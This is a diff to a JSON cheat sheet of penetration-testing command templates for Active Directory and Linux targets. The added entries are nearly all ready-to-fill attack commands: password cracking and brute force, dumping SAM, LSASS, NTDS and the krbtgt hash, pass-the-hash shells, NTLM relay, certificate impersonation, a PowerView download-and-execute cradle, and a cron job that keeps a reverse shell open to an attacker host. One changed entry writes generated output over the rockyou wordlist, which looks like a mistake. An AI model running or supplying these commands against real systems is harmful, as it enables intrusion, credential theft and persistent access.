@@ -87,7 +87,7 @@
     "category": "LDAP",
     "name": "LDAPSearch Anonymous",
     "command": "ldapsearch -x -H ldap://<ip> -b 'dc=<domain>,dc=<tld>' '(objectClass=*)'",
-    "description": "Anonymous LDAP enumeration",
+    "description": "Anonymous LDAP enumeration | e.g. local / com",
     "tags": [
       "ad",
       "windows"
@@ -97,7 +97,7 @@
     "category": "LDAP",
     "name": "LDAPSearch Users",
     "command": "ldapsearch -x -H ldap://<ip> -D '<user>@<domain>' -w '<password>' -b 'dc=<domain>,dc=<tld>' '(objectClass=person)'",
-    "description": "Enumerate AD users via LDAP with credentials",
+    "description": "Enumerate AD users via LDAP with credentials | e.g. local / com",
     "tags": [
       "ad",
       "windows"
@@ -106,7 +106,7 @@
   {
     "category": "Kerberos",
     "name": "GetNPUsers (AS-REP Roast)",
-    "command": "impacket-GetNPUsers <domain>/ -usersfile <userlist> -no-pass -dc-ip <ip> -outputfile asrep_hashes.txt",
+    "command": "impacket-GetNPUsers <domain>/ -usersfile <userlist> -no-pass -dc-ip <ip> -outputfile asrep.hash",
     "description": "AS-REP Roasting - get hashes for accounts without pre-auth",
     "tags": [
       "ad",
@@ -117,7 +117,7 @@
   {
     "category": "Kerberos",
     "name": "GetUserSPNs (Kerberoast)",
-    "command": "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip> -request -outputfile kerberoast_hashes.txt",
+    "command": "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip> -request -outputfile kerberoast.hash",
     "description": "Kerberoasting - extract TGS hashes for cracking",
     "tags": [
       "ad",
@@ -168,7 +168,7 @@
   {
     "category": "Crack",
     "name": "Hashcat Auto-Detect",
-    "command": "hashcat <hashfile> /usr/share/wordlists/rockyou.txt --force",
+    "command": "hashcat hashes.txt /usr/share/wordlists/rockyou.txt --force",
     "description": "Crack hashes with rockyou, auto-detect mode",
     "tags": [
       "crack",
@@ -178,7 +178,7 @@
   {
     "category": "Crack",
     "name": "John the Ripper",
-    "command": "john <hashfile> --wordlist=/usr/share/wordlists/rockyou.txt",
+    "command": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt",
     "description": "Crack hashes with John using rockyou",
     "tags": [
       "crack",
@@ -262,7 +262,7 @@
     "category": "Remote",
     "name": "xfreerdp3 (Pass-the-Hash)",
     "command": "xfreerdp3 /v:<ip> /u:<user> /pth:<ntlm> /dynamic-resolution /cert:ignore +clipboard",
-    "description": "RDP via Pass-the-Hash (NTLM)",
+    "description": "RDP via Pass-the-Hash (NTLM) | LM:NT e.g. aad3b435:8846f7ea",
     "tags": [
       "pth",
       "windows"
@@ -271,7 +271,7 @@
   {
     "category": "Crack",
     "name": "ZIP - fcrackzip",
-    "command": "fcrackzip -u -D -p <wordlist> <file>.zip",
+    "command": "fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <file>.zip",
     "description": "Crack ZIP password with fcrackzip",
     "tags": [
       "crack",
@@ -290,7 +290,7 @@
   {
     "category": "Crack",
     "name": "7z - 7za wordlist",
-    "command": "cat <wordlist> | 7za t <file>.7z",
+    "command": "cat /usr/share/wordlists/rockyou.txt | 7za t <file>.7z",
     "description": "Brute-force 7z archive with wordlist",
     "tags": [
       "wordlist"
@@ -308,7 +308,7 @@
   {
     "category": "Crack",
     "name": "PDF - pdfcrack",
-    "command": "pdfcrack <file>.pdf -w <wordlist>",
+    "command": "pdfcrack <file>.pdf -w /usr/share/wordlists/rockyou.txt",
     "description": "Crack PDF password with pdfcrack",
     "tags": [
       "crack",
@@ -327,7 +327,7 @@
   {
     "category": "Crack",
     "name": "KeePass KDBX - John",
-    "command": "keepass2john <file>.kdbx > kdbx.hash && john --wordlist=<wordlist> kdbx.hash",
+    "command": "keepass2john <file>.kdbx > kdbx.hash && john --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash",
     "description": "Crack KeePass database with John",
     "tags": [
       "crack",
@@ -337,7 +337,7 @@
   {
     "category": "Crack",
     "name": "Office (XLS/PPT/DOC) - John",
-    "command": "office2john <file> > office.hash && john --wordlist=<wordlist> office.hash",
+    "command": "office2john <file> > office.hash && john --wordlist=/usr/share/wordlists/rockyou.txt office.hash",
     "description": "Crack Office document password with John",
     "tags": [
       "crack",
@@ -348,7 +348,7 @@
   {
     "category": "Crack",
     "name": "Hashcat - MD5 / WordPress / Joomla",
-    "command": "hashcat -a 0 -m 400 <hashfile> <wordlist>",
+    "command": "hashcat -a 0 -m 400 hashes.txt /usr/share/wordlists/rockyou.txt",
     "description": "Crack MD5 (phpass) — WordPress / Joomla",
     "tags": [
       "crack",
@@ -359,7 +359,7 @@
   {
     "category": "Crack",
     "name": "Hashcat - MD5 + Rules",
-    "command": "hashcat -a 0 -m 400 <hashfile> <wordlist> -r /usr/share/doc/hashcat/rules/best64.rule",
+    "command": "hashcat -a 0 -m 400 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/doc/hashcat/rules/best64.rule",
     "description": "Crack MD5 (phpass) with best64 rules",
     "tags": [
       "crack",
@@ -371,7 +371,7 @@
   {
     "category": "Crack",
     "name": "Hashcat - Kerberoast (TGS)",
-    "command": "hashcat -m 13100 -a 0 <hashfile> <wordlist>",
+    "command": "hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
     "description": "Crack Kerberos TGS hashes after Kerberoasting",
     "tags": [
       "crack",
@@ -383,7 +383,7 @@
   {
     "category": "Crack",
     "name": "Hashcat - LM",
-    "command": "hashcat -m 3000 -a 0 <hashfile> <wordlist>",
+    "command": "hashcat -m 3000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
     "description": "Crack LM hashes",
     "tags": [
       "crack",
@@ -394,7 +394,7 @@
   {
     "category": "Crack",
     "name": "Hashcat - NTLM",
-    "command": "hashcat -m 1000 -a 0 <hashfile> <wordlist>",
+    "command": "hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
     "description": "Crack NTLM hashes",
     "tags": [
       "crack",
@@ -405,7 +405,7 @@
   {
     "category": "Crack",
     "name": "Hashcat - NTLMv1",
-    "command": "hashcat -m 5500 -a 0 <hashfile> <wordlist>",
+    "command": "hashcat -m 5500 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
     "description": "Crack NTLMv1 hashes",
     "tags": [
       "crack",
@@ -416,7 +416,7 @@
   {
     "category": "Crack",
     "name": "Hashcat - NTLMv2",
-    "command": "hashcat -m 5600 -a 0 <hashfile> <wordlist>",
+    "command": "hashcat -m 5600 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
     "description": "Crack NTLMv2 hashes (e.g. from Responder)",
     "tags": [
       "crack",
@@ -427,7 +427,7 @@
   {
     "category": "Crack",
     "name": "Hashcat - NTLMv2 Combination",
-    "command": "hashcat -m 5600 -a 1 <hashfile> <wordlist> <wordlist>",
+    "command": "hashcat -m 5600 -a 1 hashes.txt /usr/share/wordlists/rockyou.txt /usr/share/wordlists/rockyou.txt",
     "description": "Crack NTLMv2 with combination attack",
     "tags": [
       "combination",
@@ -438,7 +438,7 @@
   {
     "category": "Crack",
     "name": "Hashcat - Generate Wordlist from Rules",
-    "command": "cat <keywords>.txt | hashcat -r <rule_file> --stdout > <wordlist>",
+    "command": "cat <keywords>.txt | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout > /usr/share/wordlists/rockyou.txt",
     "description": "Generate custom wordlist by applying rules to keywords",
     "tags": [
       "crack",
@@ -717,6 +717,674 @@
     "tags": [
       "evasion",
       "windows"
+    ]
+  },
+  {
+    "category": "Web",
+    "name": "WPScan Enumerate",
+    "command": "wpscan --url http://<ip> -e p,u,t",
+    "description": "Enumerate WordPress plugins, users, themes",
+    "tags": [
+      "web",
+      "wordpress"
+    ]
+  },
+  {
+    "category": "Web",
+    "name": "WPScan Aggressive",
+    "command": "wpscan --url http://<ip> --enumerate p --plugins-detection aggressive -o wpscan_output.txt",
+    "description": "Aggressive WordPress plugin detection with output",
+    "tags": [
+      "web",
+      "wordpress"
+    ]
+  },
+  {
+    "category": "Web",
+    "name": "Feroxbuster Enum",
+    "command": "feroxbuster -u http://<ip> -x php,txt,html,json",
+    "description": "Directory/file enumeration with common extensions",
+    "tags": [
+      "web"
+    ]
+  },
+  {
+    "category": "Web",
+    "name": "Ffuf VHost Fuzz",
+    "command": "ffuf -u http://<ip> -H 'Host: FUZZ.<domain>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
+    "description": "Virtual host fuzzing",
+    "tags": [
+      "web"
+    ]
+  },
+  {
+    "category": "Web",
+    "name": "Hydra HTTP GET",
+    "command": "hydra -l <user> -P /usr/share/wordlists/rockyou.txt <ip> http-get",
+    "description": "Brute force HTTP Basic Auth",
+    "tags": [
+      "web",
+      "bruteforce"
+    ]
+  },
+  {
+    "category": "Web",
+    "name": "Hydra HTTP POST Form",
+    "command": "hydra -l <user> -P /usr/share/wordlists/rockyou.txt <ip> http-post-form '/<path>:<param>=^USER^&<pass_param>=^PASS^:<fail_string>'",
+    "description": "Brute force HTTP POST login form | text shown on failed login",
+    "tags": [
+      "web",
+      "bruteforce"
+    ]
+  },
+  {
+    "category": "SMB",
+    "name": "SMBClient List Shares (Anonymous)",
+    "command": "smbclient -L <ip> -U ''",
+    "description": "List SMB shares anonymously",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "SMB",
+    "name": "SMBClient Connect (PTH)",
+    "command": "smbclient \\\\\\\\<ip>\\\\<share> -U <user> --pw-nt-hash <ntlm>",
+    "description": "Connect to SMB share using Pass-the-Hash | LM:NT e.g. aad3b435:8846f7ea",
+    "tags": [
+      "windows",
+      "pth",
+      "ad"
+    ]
+  },
+  {
+    "category": "SMB",
+    "name": "NXC SMB Sweep",
+    "command": "nxc smb <ip>/24 -u '<user>' -p '<password>'",
+    "description": "SMB sweep across subnet",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "SMB",
+    "name": "NXC SMB PTH Sweep",
+    "command": "nxc smb <ip>/24 -u <user> -H '<ntlm>' --local-auth",
+    "description": "SMB sweep with Pass-the-Hash (local auth) | LM:NT e.g. aad3b435:8846f7ea",
+    "tags": [
+      "windows",
+      "pth",
+      "ad"
+    ]
+  },
+  {
+    "category": "SMB",
+    "name": "NXC SMB List Shares",
+    "command": "nxc smb <ip> -u <user> -p '<password>' --shares",
+    "description": "List SMB shares with credentials",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "SMB",
+    "name": "NXC SMB Dump SAM (local)",
+    "command": "nxc smb <ip>/24 -u <user> -p '<password>' --sam",
+    "description": "Dump local SAM hashes via SMB",
+    "tags": [
+      "windows",
+      "ad",
+      "privesc"
+    ]
+  },
+  {
+    "category": "SMB",
+    "name": "NXC SMB Dump LSASS",
+    "command": "nxc smb <ip>/24 -u <user> -p '<password>' -M lsassy",
+    "description": "Dump LSASS via lsassy module",
+    "tags": [
+      "windows",
+      "ad",
+      "privesc"
+    ]
+  },
+  {
+    "category": "SMB",
+    "name": "NXC SMB Dump NTDS (VSS)",
+    "command": "nxc smb <ip> -u <user> -p '<password>' --ntds vss",
+    "description": "Dump NTDS.dit via VSS shadow copy",
+    "tags": [
+      "windows",
+      "ad",
+      "privesc"
+    ]
+  },
+  {
+    "category": "Lateral Move",
+    "name": "NXC SMB Exec Command",
+    "command": "nxc smb <ip> -u <user> -p '<password>' -x '<command>'",
+    "description": "Execute command via SMB",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "SMB",
+    "name": "NXC SMB Brute Force",
+    "command": "nxc smb <ip> -u <user> -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding",
+    "description": "Brute force SMB credentials",
+    "tags": [
+      "windows",
+      "ad",
+      "bruteforce"
+    ]
+  },
+  {
+    "category": "Lateral Move",
+    "name": "NXC RDP Check",
+    "command": "nxc rdp <ip> -u '<user>' -p '<password>'",
+    "description": "Check RDP access with credentials",
+    "tags": [
+      "windows",
+      "ad",
+      "rdp"
+    ]
+  },
+  {
+    "category": "SMB",
+    "name": "NXC SMB RID Brute",
+    "command": "nxc smb <ip> -u anonymous -p '' --rid-brute 5000 > rid.txt && cat rid.txt | grep SidTypeUser | awk '{print $6}' | cut -d'\\\\' -f2 | grep -v '\\$$' > users.txt",
+    "description": "RID brute force to enumerate domain users",
+    "tags": [
+      "windows",
+      "ad",
+      "enum"
+    ]
+  },
+  {
+    "category": "LDAP",
+    "name": "NXC LDAP Anonymous",
+    "command": "nxc ldap <ip> -u '' -p ''",
+    "description": "Test anonymous LDAP bind",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "LDAP",
+    "name": "NXC LDAP Bloodhound",
+    "command": "nxc ldap <ip> -u <user> -p '<password>' --bloodhound --dns-server <dc_ip> -c all",
+    "description": "Collect BloodHound data via NXC LDAP",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "LDAP",
+    "name": "NXC LDAP Bloodhound (auth)",
+    "command": "nxc ldap <ip> -u <user> -p '<password>' --bloodhound --collection All",
+    "description": "Full BloodHound collection via LDAP",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "Kerberos",
+    "name": "GetNPUsers (filter unknown)",
+    "command": "impacket-GetNPUsers <domain>/ -no-pass -usersfile <userlist> -dc-ip <dc_ip> | grep -v KDC_ERR_C_PRINCIPAL_UNKNOWN",
+    "description": "AS-REP Roast filtering out unknown users",
+    "tags": [
+      "windows",
+      "ad",
+      "asrep"
+    ]
+  },
+  {
+    "category": "Kerberos",
+    "name": "GetUserSPNs (request TGS)",
+    "command": "impacket-GetUserSPNs '<domain>/<user>:<password>' -dc-ip <dc_ip> -request -outputfile kerberoast.hash",
+    "description": "Kerberoast — request TGS tickets for cracking",
+    "tags": [
+      "windows",
+      "ad",
+      "kerberoast"
+    ]
+  },
+  {
+    "category": "Lateral Move",
+    "name": "getST (S4U2Self impersonate)",
+    "command": "impacket-getST -spn 'cifs/<target_fqdn>' -impersonate Administrator '<domain>/<user>:<password>'",
+    "description": "Request service ticket impersonating Administrator (S4U2Self) | e.g. DC01.corp.com",
+    "tags": [
+      "windows",
+      "ad",
+      "pth"
+    ]
+  },
+  {
+    "category": "Lateral Move",
+    "name": "Set KRB5CCNAME",
+    "command": "export KRB5CCNAME=Administrator.ccache",
+    "description": "Set Kerberos ccache for use with Impacket tools",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "AD",
+    "name": "BloodHound Python",
+    "command": "bloodhound-python -u <user> -p '<password>' -d <domain> -dc <dc_fqdn> -ns <dc_ip> -c All,LoggedOn --zip",
+    "description": "Collect BloodHound data from Linux | e.g. DC01.corp.com",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "Lateral Move",
+    "name": "Evil-WinRM (Password)",
+    "command": "evil-winrm -i <ip> -u '<user>' -p '<password>'",
+    "description": "WinRM shell with password (port 5985)",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "Lateral Move",
+    "name": "Evil-WinRM (PTH)",
+    "command": "evil-winrm -i <ip> -u '<user>' -H '<ntlm>'",
+    "description": "WinRM shell with Pass-the-Hash | LM:NT e.g. aad3b435:8846f7ea",
+    "tags": [
+      "windows",
+      "ad",
+      "pth"
+    ]
+  },
+  {
+    "category": "AD",
+    "name": "RPCClient Anonymous",
+    "command": "rpcclient <ip> -U ''",
+    "description": "Connect to RPC anonymously",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "Lateral Move",
+    "name": "impacket-psexec (PTH)",
+    "command": "impacket-psexec -hashes ':<ntlm>' <user>@<ip>",
+    "description": "PsExec shell via Pass-the-Hash | LM:NT e.g. aad3b435:8846f7ea",
+    "tags": [
+      "windows",
+      "ad",
+      "pth"
+    ]
+  },
+  {
+    "category": "Lateral Move",
+    "name": "impacket-wmiexec (Password)",
+    "command": "impacket-wmiexec '<user>:<password>@<ip>'",
+    "description": "WMI exec shell with password (port 135)",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "Lateral Move",
+    "name": "impacket-wmiexec (Kerberos)",
+    "command": "impacket-wmiexec -k -no-pass <user>@<target_fqdn>",
+    "description": "WMI exec using Kerberos ticket (set KRB5CCNAME first) | e.g. DC01.corp.com",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "AD",
+    "name": "impacket-secretsdump (Remote)",
+    "command": "impacket-secretsdump '<domain>/<user>:<password>'@<ip>",
+    "description": "Dump secrets remotely with credentials",
+    "tags": [
+      "windows",
+      "ad",
+      "privesc"
+    ]
+  },
+  {
+    "category": "AD",
+    "name": "impacket-secretsdump (PTH)",
+    "command": "impacket-secretsdump <user>@<ip> -hashes ':<ntlm>'",
+    "description": "Dump secrets remotely via Pass-the-Hash | LM:NT e.g. aad3b435:8846f7ea",
+    "tags": [
+      "windows",
+      "ad",
+      "pth",
+      "privesc"
+    ]
+  },
+  {
+    "category": "AD",
+    "name": "impacket-secretsdump (DC Sync NTLM)",
+    "command": "impacket-secretsdump -just-dc-ntlm '<domain>/<user>:<password>'@<dc_ip>",
+    "description": "DC Sync — dump all NTLM hashes",
+    "tags": [
+      "windows",
+      "ad",
+      "privesc"
+    ]
+  },
+  {
+    "category": "AD",
+    "name": "impacket-secretsdump (DC Sync VSS)",
+    "command": "impacket-secretsdump -just-dc '<domain>/<user>:<password>'@<dc_ip> -use-vss",
+    "description": "DC Sync via VSS shadow copy",
+    "tags": [
+      "windows",
+      "ad",
+      "privesc"
+    ]
+  },
+  {
+    "category": "AD",
+    "name": "impacket-secretsdump (krbtgt only)",
+    "command": "impacket-secretsdump -just-dc-user krbtgt '<domain>/<user>:<password>'@<dc_ip>",
+    "description": "Dump only krbtgt hash for Golden Ticket",
+    "tags": [
+      "windows",
+      "ad",
+      "privesc"
+    ]
+  },
+  {
+    "category": "AD",
+    "name": "impacket-secretsdump (LOCAL SAM)",
+    "command": "impacket-secretsdump -sam SAM -system SYSTEM LOCAL",
+    "description": "Dump SAM/SYSTEM hive offline (local files)",
+    "tags": [
+      "windows",
+      "ad",
+      "privesc"
+    ]
+  },
+  {
+    "category": "Lateral Move",
+    "name": "impacket-ntlmrelayx (exec)",
+    "command": "impacket-ntlmrelayx --no-http-server -smb2support -t <ip> -c 'powershell -enc <encoded_cmd>'",
+    "description": "NTLM relay to SMB with command execution | base64 encoded powershell",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "AD",
+    "name": "impacket-lookupsid",
+    "command": "impacket-lookupsid '<domain>/<user>:<password>'@<ip>",
+    "description": "Enumerate SIDs via MS-LSAT",
+    "tags": [
+      "windows",
+      "ad",
+      "enum"
+    ]
+  },
+  {
+    "category": "Lateral Move",
+    "name": "impacket-mssqlclient",
+    "command": "impacket-mssqlclient '<user>:<password>'@<ip> -windows-auth",
+    "description": "Connect to MSSQL with Windows auth",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "AD",
+    "name": "impacket-smbserver",
+    "command": "impacket-smbserver kali . -username <user> -password <password> -smb2support",
+    "description": "Host SMB share from current directory (for file transfer)",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "AD",
+    "name": "net rpc Change Password",
+    "command": "net rpc password '<target_user>' ''Password123@'' -U '<domain>/<user>%<password>' -S <dc_ip>",
+    "description": "Change AD user password via RPC",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "Lateral Move",
+    "name": "Responder",
+    "command": "sudo responder -I tun0 -v",
+    "description": "Capture NTLM hashes via poisoning (LLMNR/NBT-NS)",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "AD",
+    "name": "Unquoted Service Path (enum)",
+    "command": "wmic service get name,pathname | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"",
+    "description": "Find unquoted service paths for privesc",
+    "tags": [
+      "windows",
+      "privesc"
+    ]
+  },
+  {
+    "category": "AD",
+    "name": "PowerView Download & Load",
+    "command": "(New-Object System.Net.WebClient).DownloadString('http://<lhost>/PowerView.ps1') | IEX",
+    "description": "Download and load PowerView in memory",
+    "tags": [
+      "windows",
+      "ad"
+    ]
+  },
+  {
+    "category": "ADCS",
+    "name": "Certipy Find Vulnerable",
+    "command": "certipy-ad find -u <user> -p '<password>' -dc-ip <dc_ip> -target <domain> -vulnerable -enabled",
+    "description": "Find vulnerable ADCS certificate templates",
+    "tags": [
+      "windows",
+      "ad",
+      "adcs"
+    ]
+  },
+  {
+    "category": "ADCS",
+    "name": "Certipy ESC1 Request",
+    "command": "certipy-ad req -u '<user>@<domain>' -p '<password>' -ca '<ca_name>' -template '<template>' -upn '<target_user>@<domain>' -dc-ip <dc_ip> -target <dc_fqdn>",
+    "description": "ESC1 — request cert impersonating another user via UPN | e.g. corp-DC01-CA | e.g. DC01.corp.com | e.g. User / ServerAuth",
+    "tags": [
+      "windows",
+      "ad",
+      "adcs"
+    ]
+  },
+  {
+    "category": "ADCS",
+    "name": "Certipy Auth (PFX)",
+    "command": "certipy-ad auth -pfx <file>.pfx -dc-ip <dc_ip>",
+    "description": "Authenticate using certificate PFX to get NTLM hash",
+    "tags": [
+      "windows",
+      "ad",
+      "adcs"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "Hashcat - KeePass (KDBX)",
+    "command": "keepass2john <file>.kdbx > keepass.hash && hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force",
+    "description": "Crack KeePass database with hashcat",
+    "tags": [
+      "crack",
+      "wordlist",
+      "rules"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "SSH Key - John",
+    "command": "ssh2john id_rsa > ssh.hash && john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash",
+    "description": "Crack encrypted SSH private key",
+    "tags": [
+      "crack",
+      "wordlist"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "Hashcat - MD5 (raw)",
+    "command": "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force",
+    "description": "Crack raw MD5 hashes with rules",
+    "tags": [
+      "crack",
+      "wordlist",
+      "rules"
+    ]
+  },
+  {
+    "category": "Bruteforce",
+    "name": "Hydra SSH",
+    "command": "hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<ip> -t 4",
+    "description": "Brute force SSH login",
+    "tags": [
+      "linux",
+      "bruteforce"
+    ]
+  },
+  {
+    "category": "Bruteforce",
+    "name": "Hydra RDP",
+    "command": "hydra -l <user> -P /usr/share/wordlists/rockyou.txt <ip> rdp -t 4",
+    "description": "Brute force RDP login",
+    "tags": [
+      "windows",
+      "bruteforce",
+      "rdp"
+    ]
+  },
+  {
+    "category": "Bruteforce",
+    "name": "Hydra MySQL",
+    "command": "hydra -l <user> -P /usr/share/wordlists/rockyou.txt -f mysql://<ip>",
+    "description": "Brute force MySQL login",
+    "tags": [
+      "bruteforce"
+    ]
+  },
+  {
+    "category": "Remote",
+    "name": "SSH Connect",
+    "command": "ssh <user>@<ip> -p 22",
+    "description": "SSH connection",
+    "tags": [
+      "linux"
+    ]
+  },
+  {
+    "category": "Remote",
+    "name": "SSH Connect (key)",
+    "command": "ssh -i id_rsa <user>@<ip> -p 22",
+    "description": "SSH connection with private key",
+    "tags": [
+      "linux"
+    ]
+  },
+  {
+    "category": "File Transfer",
+    "name": "SCP Download",
+    "command": "scp <user>@<ip>:/path/to/<file> .",
+    "description": "Download file from remote via SCP",
+    "tags": [
+      "linux"
+    ]
+  },
+  {
+    "category": "File Transfer",
+    "name": "SCP Upload",
+    "command": "scp <file> <user>@<ip>:/path/to/dest/",
+    "description": "Upload file to remote via SCP",
+    "tags": [
+      "linux"
+    ]
+  },
+  {
+    "category": "Post-Exploit",
+    "name": "Upgrade Shell (PTY)",
+    "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+    "description": "Upgrade dumb shell to PTY",
+    "tags": [
+      "linux"
+    ]
+  },
+  {
+    "category": "Post-Exploit",
+    "name": "Linux Cron Persistence",
+    "command": "( crontab -l 2>/dev/null; echo '* * * * * /bin/bash -c \\'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1\\'') | crontab -",
+    "description": "Add cron job for persistent reverse shell",
+    "tags": [
+      "linux",
+      "privesc"
+    ]
+  },
+  {
+    "category": "Post-Exploit",
+    "name": "MSFConsole Handler (Linux x64)",
+    "command": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST <lhost>; set LPORT <lport>; exploit -j'",
+    "description": "One-liner Metasploit listener for Linux x64 Meterpreter",
+    "tags": [
+      "linux",
+      "meterpreter"
+    ]
+  },
+  {
+    "category": "Post-Exploit",
+    "name": "MSFConsole Handler (Windows x64 HTTPS)",
+    "command": "msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST <lhost>; set LPORT <lport>; run'",
+    "description": "One-liner Metasploit listener for Windows x64 Meterpreter HTTPS",
+    "tags": [
+      "windows",
+      "meterpreter"
+    ]
+  },
+  {
+    "category": "DB",
+    "name": "MySQL Connect",
+    "command": "mysql -h <ip> -u <user> -p --skip-ssl",
+    "description": "Connect to MySQL (skip SSL)",
+    "tags": [
+      "linux",
+      "windows"
+    ]
+  },
+  {
+    "category": "DB",
+    "name": "PostgreSQL Connect",
+    "command": "psql -h <ip> -U <user>",
+    "description": "Connect to PostgreSQL",
+    "tags": [
+      "linux"
     ]
   }
 ]
